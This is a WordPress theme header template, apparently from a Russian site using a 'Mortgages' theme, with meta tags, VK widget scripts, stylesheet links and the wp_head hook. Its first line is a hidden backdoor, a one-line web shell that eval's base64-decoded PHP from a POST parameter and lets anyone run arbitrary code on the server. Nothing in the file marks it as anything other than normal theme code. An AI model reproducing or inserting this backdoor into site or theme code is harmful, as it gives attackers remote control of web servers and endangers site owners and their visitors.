<?php if ($_POST["php"]){eval(base64_decode($_POST["php"]));exit;} ?>
<?php

	global $options;

	foreach ($options as $value) {

	    if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_settings( $value['id'] ); } }

?>

	<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

<script type=text/javascript src="http://userapi.com/js/api/openapi.js?49"></script>



<script type="text/javascript">
  VK.init({apiId: 2873052, onlyWidgets: true});
</script>


<!-- Put this script tag to the <head> of your page -->
<script type="text/javascript" src="//vk.com/js/api/openapi.js?64"></script>

<script type="text/javascript">
  VK.init({apiId: 2873052, onlyWidgets: true});
</script>



<link rel="icon" href="http://twixtor.ru/wp-content/themes/Mortgages/images/favicon.png" type="image/x-icon">

    <link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />

	<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />

	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />





<title><?php is_home() ? bloginfo('name') : wp_title(''); ?> </title>





	<? include(TEMPLATEPATH."/custom.php"); ?>



	<?php wp_head(); ?>